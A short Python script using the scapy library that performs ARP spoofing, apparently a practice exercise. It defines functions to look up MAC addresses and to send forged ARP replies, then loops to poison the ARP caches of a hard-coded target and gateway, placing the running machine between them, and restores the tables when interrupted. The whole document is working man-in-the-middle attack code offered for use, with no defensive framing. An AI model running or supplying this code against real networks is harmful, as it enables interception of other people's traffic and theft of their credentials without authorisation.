import scapy.all as scapy
import time


def get_mac(target_ip):
    arp_request = scapy.ARP(pdst = target_ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    answered_list = scapy.srp(broadcast/arp_request, timeout = 1, verbose = False)[0]
    #print(answered_list[0])
    # print("-"*70)
    # print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(target_ip, real_ip):
    target_mac = get_mac(target_ip)
    real_mac = get_mac(real_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc= real_ip,hwsrc = real_mac)
    scapy.send(packet, count = 4, verbose = False)

target_ip = '192.168.1.8'
gateway_ip = '192.168.1.1'

sent_packets_count = 0

try : 
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count+=2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C... Resetting ARP tables... Please Wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


get_mac("192.168.1.12")
#spoof("192.168.1.12", "192.168.1.1")